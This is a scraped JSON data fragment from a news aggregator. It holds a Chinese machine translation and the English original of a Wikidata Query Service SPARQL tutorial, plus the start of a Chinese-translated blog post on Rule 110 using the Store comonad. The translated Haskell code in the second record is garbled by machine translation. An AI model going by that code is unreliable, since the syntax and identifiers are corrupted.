679c\u4f60\u60f3\u4e0e\u5176\u4ed6\u4eba\u5206\u4eab\u4f60\u7684\u67e5\u8be2--\u6bd4\u5982\u5728\u793e\u4ea4\u5a92\u4f53\u4e0a--\u4f60\u53ef\u4ee5\u4e3a\u4f60\u7684\u67e5\u8be2\u521b\u5efa\u4e00\u4e2a\u7b80\u77ed\u7684\u94fe\u63a5\u3002\n\u6709\u66f4\u591a\u65b9\u6cd5\u53ef\u4ee5\u53ef\u89c6\u5316\u67e5\u8be2\u7ed3\u679c\u3002\u5982\u679c\u67e5\u8be2\u8981\u6c42\u63d0\u4f9b\u5730\u7406\u5750\u6807\uff0c\u5219\u53ef\u4ee5\u5728\u5730\u56fe\u4e0a\u663e\u793a\u7ed3\u679c\u3002\n\u770b\u770b\u8fd9\u4e2a\u632a\u5a01\u706f\u5854\u7684\u4f8b\u5b50\u3002\u8fd0\u884c\u67e5\u8be2\u65f6\uff0c\u60a8\u5c06\u770b\u5230\u6807\u8bb0\u632a\u5a01\u6d77\u5cb8\u706f\u5854\u4f4d\u7f6e\u7684\u7ea2\u70b9\u3002\n\u52a0\u8f7d\u67e5\u8be2\u7ed3\u679c\u540e\uff0c\u60a8\u53ef\u4ee5\u5728\u6bcf\u4e2a\u7ed3\u679c\u4e0a\u770b\u5230\u653e\u5927\u955c\u56fe\u6807\u3002\u5355\u51fb\u6b64\u56fe\u6807\u5c06\u6253\u5f00\u8d44\u6e90\u7ba1\u7406\u5668\u5bf9\u8bdd\u6846\u3002\n\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8d44\u6e90\u7ba1\u7406\u5668\u5bf9\u8bdd\u6846\u663e\u793a\u8868\u793a\u8be5\u7279\u5b9a\u7ed3\u679c\u7684\u5355\u4e2a\u8282\u70b9\u3002\u5728\u8282\u70b9\u4e0b\u65b9\uff0c\u60a8\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u9ed8\u8ba4\u4e3a\u201cOutput\u201d\u7684\u5207\u6362\u3002\u8fd9\u610f\u5473\u7740\u5355\u51fb\u4efb\u4f55\u8282\u70b9\u90fd\u5c06\u4ece\u6574\u4e2aWikidata\u77e5\u8bc6\u5e93\u5c55\u5f00\u8be5\u8282\u70b9\u7684\u6240\u6709\u5c5e\u6027\u3002\u5c06\u5176\u5207\u6362\u4e3a\u201c\u4f20\u5165\u201d\u5141\u8bb8\u60a8\u67e5\u770b\u6307\u5411\u8be5\u8282\u70b9\u7684\u6240\u6709\u4f20\u5165\u94fe\u63a5\u6216\u5c5e\u6027\u3002\u8fd9\u662f\u4e00\u79cd\u4f7f\u7528Wikidata\u63a2\u7d22\u5404\u79cd\u9879\u53ca\u5176\u5c5e\u6027\u4e4b\u95f4\u7684\u6240\u6709\u5173\u7cfb\u7684\u65b9\u6cd5\u3002\n\u60a8\u53ef\u4ee5\u4e00\u6b21\u6253\u5f00\u591a\u4e2a\u8d44\u6e90\u7ba1\u7406\u5668\u5bf9\u8bdd\u6846\uff0c\u4ece\u800c\u53ef\u4ee5\u4e00\u6b21\u6bd4\u8f83\u591a\u4e2a\u67e5\u8be2\u7684\u7ed3\u679c\u3002\u8d44\u6e90\u7ba1\u7406\u5668\u5bf9\u8bdd\u6846\u5728\u53f3\u4e0b\u89d2\u4e5f\u6709\u4e00\u4e2a\u5de5\u5177\u680f\uff0c\u7528\u4e8e\u5728\u591a\u4e2a\u89c6\u56fe(\u5982Graph\u3001Tree\u3001Map\u3001Table\u7b49)\u4e4b\u95f4\u5207\u6362\u3002\n\u5728\u7f16\u8f91\u5668\u4e2d\uff0c\u60a8\u53ef\u4ee5\u5728\u67e5\u8be2\u4e2d\u7684\u4efb\u4f55\u4f4d\u7f6e\u6309Ctrl+\u7a7a\u683c\u952e\uff0c\u5e76\u83b7\u5f97\u53ef\u80fd\u9002\u5408\u7684\u4ee3\u7801\u5efa\u8bae\uff1b\u4f7f\u7528\u5411\u4e0a/\u5411\u4e0b\u7bad\u5934\u952e\u9009\u62e9\u6b63\u786e\u7684\u5efa\u8bae\uff0c\u7136\u540e\u6309Enter\u952e\u5c06\u5176\u9009\u4e2d\u3002\n\u4f8b\u5982\uff0c\u4e0d\u662f\u5199\u51fa\u670d\u52a1wikibase\uff1alabel{bd\uff1aserviceParam wikibase\uff1alanguage&#34\uff1ben&#34\uff1b\u3002}\u6bcf\u6b21\u53ea\u9700\u8f93\u5165server\uff0c\u6309Ctrl+\u7a7a\u683c\u952e\uff0c\u7b2c\u4e00\u4e2a\u5efa\u8bae\u5c31\u662f\u5b8c\u6574\u7684\u6807\u7b7e\u670d\u52a1\u5492\u8bed\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e86\uff01\u53ea\u9700\u6309Enter\u952e\u63a5\u53d7\u5373\u53ef\u3002(\u683c\u5f0f\u4f1a\u7a0d\u6709\u4e0d\u540c\uff0c\u4f46\u8fd9\u65e0\u5173\u7d27\u8981\u3002)\u3002\n\u81ea\u52a8\u5b8c\u6210\u529f\u80fd\u8fd8\u53ef\u4ee5\u641c\u7d22\u60a8\u7684\u4fe1\u606f\u3002\u5982\u679c\u60a8\u952e\u5165\u67d0\u4e2aWikidata\u524d\u7f00\uff0c\u5982wd\uff1a\u6216wdt\uff1a\uff0c\u7136\u540e\u53ea\u9700\u8f93\u5165\u6587\u672c\uff0cCtrl+Space\u5c06\u5728Wikidata\u4e0a\u641c\u7d22\u8be5\u6587\u672c\u5e76\u63d0\u4f9b\u5efa\u8bae\u7ed3\u679c\u3002WD\uff1a\u641c\u7d22\u9879\u76ee\uff0cWDT\uff1a\u641c\u7d22\u5c5e\u6027\u3002\u4f8b\u5982\uff0c\u60a8\u53ef\u4ee5\u76f4\u63a5\u952e\u5165wd\uff1abach\u548cwdt\uff1afath\uff0c\u7136\u540e\u4ece\u81ea\u52a8\u5b8c\u6210\u4e2d\u9009\u62e9\u6b63\u786e\u7684\u6761\u76ee\uff0c\u800c\u4e0d\u662f\u67e5\u627eJohann Sebastian Bach\u548cParent\u7684\u6761\u76ee\u3002(\u8fd9\u751a\u81f3\u9002\u7528\u4e8e\u6587\u672c\u4e2d\u7684\u7a7a\u683c\uff0c\u4f8b\u5982\u202fG.wd\uff1a\u7ea6\u7ff0\u00b7\u585e\u5df4\u65af\u8482\u5b89\u00b7\u5df4\u8d6b\u3002)\u3002\n\u60a8\u73b0\u5728\u5927\u6982\u53ef\u4ee5\u5728\u7ef4\u57fa\u6570\u636e\u67e5\u8be2\u670d\u52a1\u4e2d\u627e\u5230\u81ea\u5df1\u7684\u8def\u4e86\u3002\u63a2\u7d22\u754c\u9762\u5e76\u66f4\u6539\u67e5\u8be2\u4e2d\u7684\u503c\u662f\u5b66\u4e60\u5982\u4f55\u5728Wikidata\u4e0a\u63d0\u51fa\u60a8\u81ea\u5df1\u7684\u95ee\u9898\u7684\u597d\u65b9\u6cd5\u3002", "note_en": "Jump to navigation  Jump to search  Wikidata is a repository of knowledge. You can read an introduction to the idea and concepts behind Wikidata on our  introduction page.\n  The query language used to ask questions like that on Wikidata is called\u00a0SPARQL. If this sounds too technical and overly complicated for you, don&#39;t worry. For this gentle introduction you won&#39;t have to learn SPARQL. Instead, we will look at existing example queries and how to edit them.\n  A query is a special form of question that computer systems can understand and answer. Unless you are interacting with an Artificial Intelligence, you would need to learn how to formulate your questions in a certain way.\n  Oh yes. Wikidata can be used by anyone for everything because all data is in the Public Domain (CC0).\n  We&#39;ll start with a simple example to show you how to use this service, and as we build up to more elaborate examples, you\u2019ll get the answer to the fundamental question. Promise.\n  Let\u2019s go through a simple example demonstrating how to get a list of all known cats in the world.\n     This has now given us a list of all the famous and infamous cats on the Internet \u2013 or at least the ones Wikidata knows about. This is great, provided you are a cat person and not, say, a dog person.\n  If you want to list the dogs instead (or anything else for that matter), there are two ways to edit your query:\n Manually edit the query Each item on Wikidata is uniquely identified using a code. This code is Q146 for \u201ccat\u201d. To find the corresponding code for \u201cdog\u201d, you can look it up on Wikidata:\n  Take note of the item number for \u201cdog\u201d from the Wikidata page that opens (Q144)\n  To change your query from \u201ccat\u201d to \u201cdog\u201d, simply replace Q146 by Q144 in the SPARQL query editor.\n Run the program, and you will be presented with a list of all the famous and infamous dogs on the Internet.\n   Now let\u2019s analyse the code to generalise this so we can search for any single object (for example, dogs, planets, countries, songs):\n  SELECT A query SELECTs something. What exactly you want to select and display is described later, but for the time being you just state the placeholders (or variables). Here they are called  ?item and  ?itemLabel. You can tell that something is a variable if it starts with a question mark.\n ?item This is the list of items we are looking for. In our case that would be the famous cats. Items on Wikidata work in many different languages, almost 300 of them. Because we don\u2019t think that everything in the world is English and all the other languages are just special cases of English, items are stored in a way that works across languages. Every concept gets a number.  Q146 is the concept of a cat,  Q64 is Berlin in Germany,  Q42 is the writer Douglas Adams and so on.  Tip:  ?item is just a variable name that we decided to use in our query. It could be anything, for example: ?animal.\n ?itemLabel Humans can digest names in a human language much better than numbers. A label is the name of an item in a human language, e.g. English (or Esperanto, or Japanese, or Zulu\u2026). We want the labels displayed in our query so that  Q1371145 gets displayed as \u201cSocks\u201d (the cat belonging to Bill Clinton and family). Precise details about label service in  User manual.\n WHERE { \u00a0 This is the  WHERE clause of the query. Here we define what goes in the placeholders. A  WHERE clause starts with an opening curly bracket  { and ends with a closing curly bracket  }.\n wdt:P31 This is the predicate of the subject. If you hover over it, you\u2019ll see that it stands for instance of.\n  wd:Q146 . This is the object. If you hover over it, you\u2019ll see that it stands for cat.\n  All this is quite a mouthful. It may help to express the query in natural language:\n \u201cGive me a list of items and their labels, where the items are instances of cat. Then generate the labels to the items in English.\u201d\n With the code we used in our examples we showed you a list of all the famous and infamous cats on the Internet. This query can easily be changed to show a similar list for dogs, for example.\n  The animations below show how to write triplets in natural language, and convert them into SPARQL queries.\n  The key is to prefix variables with  ?, items with  wd: and properties with  wdt:,and then using the  Ctrl+Space (or  Ctrl+Alt+Space or  Alt+Enter) keyboard shortcut to activate the auto-completion feature that replaces the latter two with the actual Wikidata identifiers.\n     With this search query tool, you can not only customise and search for simple or aggregated, compound, nested and complex queries but you can also search in ANY language and get results in ANY language too.\n Change the default language code from \u201cen\u201d (English) to any other language code, say \u201cja\u201d for Japanese.\n #Cats  SELECT  ?item  ?itemLabel  WHERE {  ?item  wdt : P31  wd : Q146  .  SERVICE  wikibase : label  {  bd : serviceParam  wikibase : language  &#34;ja&#34;  } }\n  The order of the items displayed can be easily changed in the interface. Just click on the relevant columns of the search results to customise the sorting order:\n        So far, we\u2019ve seen the output of the queries displayed as a table. Let\u2019s try for some images:\n Click the \u201cExamples\u201d button and select the \u201cEven more cats, with pictures\u201d example. Run the query and cat images should pop up at the lower half of the screen.\n  This is what displays the result as images instead of a table. You can manually switch how the data is displayed by using the \u201cDisplay\u201d menu in the lower right corner of the result. Try switching the menu to \u201cTable\u201d to see the same result in a table view.\n Let\u2019s have a look at what\u2019s new in the query, compared to the query in the previous chapter. Written in plain English, the query would read \u201cGive me all items that have something to do with cats. Also give me the image for each item. And by the way, display the result as a grid of images, not as a table.\u201d\n #defaultView:ImageGrid What looks like a comment, is actually an instruction to display the query result as images instead of a table.\n ?x1 This means that we query for any predicate, not only for \u201cis an instance of\u201d. Think of predicates like \u201cdepicts\u201d (P180) or \u201cis named after\u201d (P138). We are not using ?x1 anywhere else in the query, meaning the placeholder stands for \u201cI don\u2019t care what the predicate is, give me all results that somehow have a cat as the subject\u201d\n OPTIONAL Inside the curly braces you see another statement that adds optional data to the result. The placeholder ?item is reused and coupled with the predicate P18 (meaning \u201c(has) image\u201d and a new placeholder ?pic. Wrapping the statement with OPTIONAL means that items do not necessarily have to have a P18 predicate to show up in the list and that the ?pic placeholder can be empty.\n  Search for dogs instead of cats. Hint: Change the Object part of the first statement in WHERE.\n Only show items that \u201cdepict\u201d cats (you\u2019ll get paintings). Hint: replace ?x1 with something else.\n There are other ways to show your data, but not all of them are always applicable, which is why some are greyed out in the menu. \u201cImage map\u201d is only selectable if the result data actually contains image URLs. In one of the following chapters you\u2019ll learn how to display items as points on a map.\n  If you want to share your query with someone else \u2013 say, on social media \u2013 you can create a short link for your query.\n     There are more ways to visualize the query results. If the query asks for geocoordinates, the results can be displayed on a map.\n Look at this example of  lighthouses in Norway. When you run the query, you\u2019ll see red dots that mark the location of lighthouses on the Norwegian coast.\n   Once the results of a query have loaded, you can see a magnifying glass icon on each result. Clicking this icon opens the Explorer Dialog.\n  The explorer dialog by default, displays a single node representing that particular result. Below the node, you can see a toggle that defaults to \u2018 Outgoing\u2019. This means that clicking on any node will expand all the properties of that node, from the entire Wikidata knowledge base. Toggling this to \u2018 Incoming\u2019 allows you to see all the incoming links or properties that point to the node. This is a way to explore all the relationships between the various items and their properties using Wikidata.\n  You can open multiple explorer dialogs at once, allowing you to compare the results of more than one query at once. The explorer dialog also has a toolbar at the bottom right corner which is used to switch between multiple views like Graph, Tree, Map, Table etc.\n      In the editor, you can press   Ctrl+ Space at any point in the query and get suggestions for code that might be appropriate; select the right suggestion with the  up/ down arrow keys, and press  Enter to select it.\n For example, instead of writing out  SERVICE wikibase:label { bd:serviceParam wikibase:language &#34;en&#34;. } every time, you can just type  SERV, hit   Ctrl+ Space, and the first suggestion will be that complete label service incantation, ready for use! Just hit  Enter to accept it. (The formatting will be a bit different, but that doesn\u2019t matter.)\n And autocompletion can also search for you. If you type one of the Wikidata prefixes, like  wd: or  wdt:, and then just write text afterwards,   Ctrl+ Space will search for that text on Wikidata and suggest results.  wd: searches for items,  wdt: for properties. For example, instead of looking up the items for  Johann Sebastian Bach   and  father  , you can just type  wd:Bach and  wdt:fath and then just select the right entry from the autocompletion. (This even works with spaces in the text, e.\u202fg.  wd:Johann Sebastian Bach.)\n    You can probably find your way around the Wikidata Query Service now. Exploring the interface and changing values in the queries can be a good way to learn how to ask your own questions on Wikidata.", "posttime": "2020-10-19 13:53:08", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u67e5\u8be2,introduction", "title": "\u7ef4\u57fa\u6570\u636e\u67e5\u8be2\u670d\u52a1\u7b80\u4ecb", "title_en": "A gentle introduction to the Wikidata Query Service", "transed": 1, "url": "https://www.wikidata.org/wiki/Wikidata:SPARQL_query_service/A_gentle_introduction_to_the_Wikidata_Query_Service#A_gentle_introduction_to_the_Wikidata_Query_Service", "via": "", "real_tags": ["\u67e5\u8be2"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1029712, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5728\u9605\u8bfb\u4e86\u514b\u91cc\u65af\u00b7\u5f6d\u7eb3(Chris Penner)\u5728Conway\u2018s Game of Life Using Represable and Comonads\u4e0a\u7684\u535a\u5ba2\u6587\u7ae0\u540e\uff0c\u6211\u51b3\u5b9a\u4e3a\u4e00\u7ef4\u81ea\u52a8\u673a\u89c4\u5219110\u5b9e\u73b0\u4e00\u4e2a\u7c7b\u4f3c\u7684\u89e3\u51b3\u65b9\u6848\u3002\u4f5c\u4e3a\u4e00\u4e2a\u5982\u6b64\u7b80\u5355\u7684\u7b97\u6cd5\uff0c\u6211\u8ba4\u4e3a\u5b83\u7684\u5b9e\u73b0\u5c06\u662f\u5fae\u4e0d\u8db3\u9053\u7684\u3002\u7136\u800c\uff0c\u4e8b\u5b9e\u8bc1\u660e\uff0c\u5728Store Comonad\u4e2d\u4f7f\u7528\u4efb\u610f\u9650\u5b9a\u7684\u7a7a\u95f4\u9700\u8981\u5de7\u5999\u5730\u4f7f\u7528\u4f9d\u8d56\u7c7b\u578b\u6765\u5e94\u7528\u56de\u5fc6\u5316\uff0c\u5982Chris&#39\uff1bblog\u4e2d\u6240\u8ff0\u3002\n\u8fd9\u7bc7\u535a\u5ba2\u6587\u7ae0\u8bb2\u8ff0\u4e86\u6211\u5c1d\u8bd5\u4f7f\u7528Store(\u53ef\u5728Haskell\u4e2d\u8868\u793a)\u6765\u5b9e\u73b0\u89c4\u5219110\u7684\u7ecf\u5386\uff0c\u5f88\u96be\u627e\u5230\u5408\u9002\u7684\u53ef\u8868\u793a\u5b9e\u4f8b\uff0c\u7136\u540e\u8f6c\u5411Idris\uff0c\u5728\u90a3\u91cc\u6211\u80fd\u591f\u4f7f\u7528\u6709\u9650\u96c6\u7c7b\u578bFin n\u6765\u89e3\u51b3\u95ee\u9898\u3002\n\u89c4\u5219110\u7b97\u6cd5\u91c7\u7528\u5e03\u5c14\u503c\u7684\u5411\u91cf\uff0c\u5e76\u5e94\u7528\u4e00\u7ec4\u7b80\u5355\u7684\u89c4\u5219\uff0c\u7528\u4e8e\u57fa\u4e8e\u6bcf\u4e2a\u7d22\u5f15\u7684\u90bb\u5c45\u6765\u8f6c\u6362\u6bcf\u4e2a\u7d22\u5f15\u3002\u4f60\u53ef\u4ee5\u628a\u5b83\u60f3\u8c61\u6210\u5eb7\u5a01\u7684\u201c\u751f\u6d3b\u7684\u6e38\u620f\u201d\u76841\u7ef4\u53d8\u4f53\uff0c\u4f46\u6709\u4e00\u70b9\u4e0d\u540c\uff0c\u90a3\u5c31\u662f\u77e2\u91cf\u7684\u7b2c\u4e00\u4e2a\u548c\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u88ab\u8ba4\u4e3a\u662f\u90bb\u5c45\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u89c4\u5219110\u4e2d\u7684\u81ea\u52a8\u673a\u5b58\u5728\u4e8e\u5706\u800c\u4e0d\u662f\u7ebf\u6bb5\u4e0a\u3002\n\u8fd9\u7bc7\u6587\u7ae0\u4e0d\u5047\u5b9a\u4e8b\u5148\u4e86\u89e3Comonad\u3001\u53ef\u8868\u793a\u7684\u51fd\u6570\u5668\u3001Fin n\u3002\u524d\u51e0\u8282\u65e8\u5728\u901a\u8fc7\u91cd\u70b9\u4ecb\u7ecd\u5b83\u4eec\u7684API\u7684\u5b9e\u9645\u5b9e\u73b0\u6765\u4ecb\u7ecd\u8fd9\u4e9b\u6982\u5ff5\u3002\nStore\u7c7b\u578b\u53ef\u4ee5\u88ab\u8ba4\u4e3a\u662f\u4e00\u79cd\u67e5\u8be2\u67d0\u4e9b\u53ef\u7d22\u5f15\u72b6\u6001\u7684\u65b9\u5f0f\uff0c\u4ee5\u53ca\u5728\u67d0\u4e2a\u7d22\u5f15\u5904\u67e5\u8be2\u5230\u5b58\u50a8\u533a\u7684\u6e38\u6807\u3002\n\u72b6\u6001\u9690\u5f0f\u4fdd\u5b58\u5728\u60a8\u7684\u67e5\u8be2\u51fd\u6570\u4e2d\uff0c\u7a0d\u540e\u6211\u4eec\u5c06\u770b\u5230\uff0c\u72b6\u6001\u53ef\u4ee5\u901a\u8fc7\u7ec4\u5408\u8fdb\u884c\u8f6c\u6362\u3002\n\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2aStore\uff0c\u5176\u9690\u5f0f\u72b6\u6001\u662f\u4f7f\u7528Integer\u5bf9\u5176\u8fdb\u884c\u7d22\u5f15\u7684\u5e03\u5c14\u503c\u7684\u65e0\u9650\u5217\u8868\uff1a\nInitialStore\uff1a\uff1aStore Int Bool initialStore=Store query 0 where query\uff1a\uff1aint-&gt\uff1bBool query i=(Cycle[True\uff0cFalse])\uff01\uff01\u8179\u808cI\n\u7136\u540e\uff0cStore API\u5141\u8bb8\u6211\u4eec\u6267\u884c\u67e5\u8be2\u4efb\u610f\u7d22\u5f15\u3001\u79fb\u52a8\u5149\u6807\u4ee5\u53ca\u901a\u8fc7\u5176\u51fd\u6570\u5668\u548cComonad\u5b9e\u4f8b\u5bf9\u67e5\u8be2\u51fd\u6570\u5185\u7684\u9690\u5f0f\u72b6\u6001\u6267\u884c\u8f6c\u6362\u7b49\u64cd\u4f5c\u3002\nPeek\uff1a\uff1as-&gt\uff1bStore s a-&gt\uff1ba Peek s(Store Query_)=\u67e5\u8be2s Peek\uff1a\uff1a(s-&&gt;s)-&gt\uff1bStore s a-&gt\uff1ba Peek f(Store Query S)=query(F S)\u3002\nPEEK\u5ffd\u7565\u5f53\u524d\u6e38\u6807\uff0c\u8f6c\u800c\u5c06\u65b0\u6e38\u6807\u5e94\u7528\u4e8e\u5546\u5e97\u7684\u67e5\u8be2\u51fd\u6570\u3002PEEKS\u4f7f\u7528\u51fd\u6570s-&gt\uff1bs\u4fee\u6539\u5f53\u524d\u6e38\u6807\uff0c\u7136\u540e\u4f7f\u7528\u65b0\u6e38\u6807\u67e5\u8be2\u5546\u5e97\u3002\nSeek\uff1a\uff1as-&gt\uff1bStore s a-&gt\uff1bStore s a\u67e5\u627ef(Store Query S)=Store Query(F S)\u3002\n\u8fd9\u4e2a\u5c01\u9762\u662f\u57fa\u672c\u7684getter\u548csetter\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u60f3\u8981\u4e00\u79cd\u5411\u6211\u4eec\u7684\u5546\u5e97\u67e5\u8be2\u591a\u4e2a\u7d22\u5f15\u7684\u65b9\u6cd5\uff0c\u8be5\u600e\u4e48\u529e\u5462\uff1f\nPeekMany\uff1a\uff1a[s]-&gt\uff1bStore s a-&gt\uff1b[a]peekMany Xs store=FMAP(\u7ffb\u8f6cpeek store)Xs\u3002\n\u6b64\u51fd\u6570\u770b\u8d77\u6765\u76f8\u5f53\u4e0d\u9519\uff0c\u4f46\u8bf7\u6ce8\u610f\u6211\u4eec\u4f7f\u7528\u7684\u662fFMAP\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u91cc\u5229\u7528\u591a\u6001\u6027\uff0c\u5141\u8bb8\u4f7f\u7528\u4efb\u4f55\u51fd\u6570\u5668\uff1a\nPeekFunctor\uff1a\uff1afunctor f=&gt\uff1bf s-&gt\uff1bStore s a-&gt\uff1bf a peekFunctor fs store=FMAP(\u7ffb\u8f6cpeek store)fs\n\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4efb\u4f55\u6211\u4eec\u60f3\u8981\u7684\u51fd\u6570\u5668\uff0c\u4f46\u662f\u8bf7\u6ce8\u610f\u6211\u4eec\u662f\u5982\u4f55\u6839\u672c\u4e0d\u4f7f\u7528\u5149\u6807\u7684\u3002\u8fd9\u662f\u4e00\u4e2a\u7ebf\u7d22\uff0c\u8868\u660e\u6211\u4eec\u4e5f\u8bb8\u80fd\u591f\u8fdb\u4e00\u6b65\u63a8\u5e7f\u8fd9\u4e2a\u51fd\u6570\u3002\n\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539peekFunctor\u4ee5\u4f7f\u7528\u6211\u4eec\u7684\u6e38\u6807\u503c\uff0c\u800c\u4e0d\u4f1a\u4e22\u5931\u51fd\u6570\u7684\u5f53\u524d\u884c\u4e3a\uff0c\u90a3\u5c31\u592a\u597d\u4e86\u3002\n\u5982\u679c\u6211\u4eec\u7528\u51fd\u6570s-&gt\uff1bf s\u66ff\u6362f s\u53c2\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06\u5f53\u524d\u6e38\u6807\u5e94\u7528\u4e8e\u6211\u4eec\u7684\u51fd\u6570\uff0c\u5e76\u751f\u6210f s\u6765\u751f\u6210\u6211\u4eec\u7684f a\u8f93\u51fa\u3002\u7136\u540e\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981peekFunctor\u7684\u7cbe\u786e\u884c\u4e3a\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5730\u5e94\u7528const(x\uff1a\uff1afs)\u5e76\u5ffd\u7565\u5f53\u524d\u6e38\u6807\uff01\n\u5b9e\u9a8c\uff1a\uff1aFunctor f=&gt\uff1b(s-&gt\uff1bf s)-&gt\uff1bstore s a-&gt\uff1bf a\u5b9e\u9a8cf store=FMAP(Flip Peek Store)(f(Pos Store))\u3002\nPOS\uff1a\uff1aStore s a-&&gt;\uff1ba Peek\uff1a\uff1aS-&&gt;\uff1bStore s a-&&gt;\uff1ba Peek\uff1a\uff1a(S-&&gt;\uff1bStore s a-&&gt;\uff1ba Seek\uff1a\uff1aS-&&gt;\uff1bStore s a-&gt\uff1ba Seek\uff1a\uff1a(S-&&gt;)Store s a-&&gt;\uff1ba\u5b9e\u9a8c\uff1a\uff1aFunctor f=&gt\uff1b(s-&&gt;\uff1bf s)-&gt\uff1b\u5546\u5e97s a-&gt\uff1bf a\u3002\n\u7cfb\u7edf\u7684\u72b6\u6001\u9690\u542b\u5730\u5b58\u50a8\u5728\u67e5\u8be2\u51fd\u6570\u5185\uff0c\u800c\u4e0d\u662f\u5b58\u50a8\u5728\u67d0\u79cd\u6570\u636e\u7ed3\u6784\u4e2d\u3002\u56e0\u6b64\uff0c\u4fee\u6539\u72b6\u6001\u7684\u552f\u4e00\u65b9\u6cd5\u662f\u4fee\u6539\u67e5\u8be2\u51fd\u6570\u672c\u8eab\u3002\n\u4e3a\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u9996\u5148\u67e5\u8be2\u5f53\u524d\u5b58\u50a8\u4ee5\u83b7\u5f97a\u503c\uff0c\u7136\u540e\u5bf9\u8be5\u503c\u5e94\u7528\u67d0\u4e2aa-&gt;b\u51fd\u6570\uff0c\u4ee5\u751f\u6210\u8be5\u7d22\u5f15\u5904\u7684\u72b6\u6001\u7684\u4fee\u6539\u7248\u672c\u3002\n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728Store\u4e0a\u8fdb\u884c\u6a21\u5f0f\u5339\u914d\u6765\u5b9e\u73b0\u8fd9\u4e00\u70b9\uff0c\u7136\u540e\u5c06a-&&gt;b\u51fd\u6570\u4e0e\u6211\u4eec\u7684\u67e5\u8be2\u51fd\u6570\u7ec4\u5408\u5728\u4e00\u8d77\uff1a\nUpdateStoreState\uff1a\uff1a(a-&gt;b)-&gt\uff1bStore s a-&gt\uff1bStore s b updateStoreState f(Store Query S)=Store(f.\u3002\u67e5\u8be2)%s\u3002\nUpdateStoreState\u5141\u8bb8\u60a8\u4fee\u6539Store\u9690\u5f0f\u72b6\u6001\u5185\u6240\u6709\u53ef\u80fd\u503c\u7684\u67e5\u8be2\u7ed3\u679c\u3002\u8fd9\u4e2a\u7b7e\u540d\u770b\u8d77\u6765\u5e94\u8be5\u5f88\u719f\u6089\uff0c\u56e0\u4e3a\u5b83\u662fFMAP\uff0c\u800cStore\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u51fd\u6570\u5668\u3002\n\u5b9e\u4f8b\u51fd\u6570(Store S)\uff0c\u5176\u4e2dFMAP\uff1a\uff1a(a-&gt;b)-&gt\uff1bStore s a-&gt\uff1bStore s b FMAP f(Store Query S)=Store(f.\u3002\u67e5\u8be2)%s\u3002\n\u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5e94\u7528FMAP\u6765\u5efa\u6a21\u72b6\u6001\u7684\u8fde\u7eed\u8f6c\u6362\u3002\u4f8b\u5982\uff0c\u4f7f\u7528\u524d\u9762\u7684Store Int Bool\u793a\u4f8b\uff0c\u6211\u4eec\u53ef\u80fd\u5e0c\u671b\u5e94\u7528Not\uff1a\uff1aBool-&gt\uff1bBool\u6765\u53cd\u8f6c\u7cfb\u7edf\u7684\u72b6\u6001\uff1a\nInitialStore\uff1a\uff1aStore Int Bool initialStore=Store query 0 where query i=(Cycle[True\uff0cFalse])\uff01\uff01I NewState\uff1a\uff1aStore Int Bool NewState=FMAP NOT InitialStore\u3002\nNewState=FMAP NOT InitialStore=FMAP NOT(Store Query S)=Store(NOT.\u3002\u67e5\u8be2)%s\u3002\n\u4f7f\u7528\u6b64\u6280\u672f\u5bf9\u7cfb\u7edf\u76843\u4e2a\u64cd\u4f5c\u8fdb\u884c\u5efa\u6a21\uff0c\u663e\u793a\u4e86\u5bf9\u9690\u5f0f\u72b6\u6001\u7684\u6bcf\u6b21\u4fee\u6539\u5982\u4f55\u6784\u5efa\u66f4\u5927\u7684\u7ec4\u5408\u67e5\u8be2\u51fd\u6570\uff1a\nNewState\uff1a\uff1a(a-&&gt;b)-&&gt;\uff1b(b-&&gt;\uff1bc)-&&gt;\uff1b(c-&&gt;d)-&gt\uff1bStore s a-&gt\uff1bStore s b Newstate h g f store=FMAP f(FMAP g(FMAP H Store))=FMAP f(FMAP g(FMAP h(Store Query S)=FMAP f(FMAP g(Store(h.\u3002\u67e5\u8be2)s)=FMAP f(\u5b58\u50a8(g\u3002H.\u3002\u67e5\u8be2)s)=\u5b58\u50a8(f.\u3002G\u3002H.\u3002\u67e5\u8be2)%s\n\u867d\u7136\u4f18\u96c5\uff0c\u4f46\u5c06\u72b6\u6001\u8f6c\u6362\u5efa\u6a21\u4e3a\u51fd\u6570\u7ec4\u5408\u610f\u5473\u7740\u6bcf\u6b21\u67e5\u8be2Store\u4e2d\u7684\u7d22\u5f15\u65f6\uff0c\u90fd\u5fc5\u987b\u91cd\u65b0\u8ba1\u7b97\u8fd4\u56de\u5230\u539f\u59cbStore\u67e5\u8be2\u7684\u6bcf\u4e2a\u5148\u524d\u7684\u8f6c\u6362\u3002\u5982\u679c\u4e0d\u7f13\u5b58\u8fd9\u4e9b\u4e2d\u95f4\u8ba1\u7b97\uff0c\u8fd9\u5c06\u53d8\u5f97\u975e\u5e38\u6602\u8d35\u3002\n\u5e78\u8fd0\u7684\u662f\uff0cChris 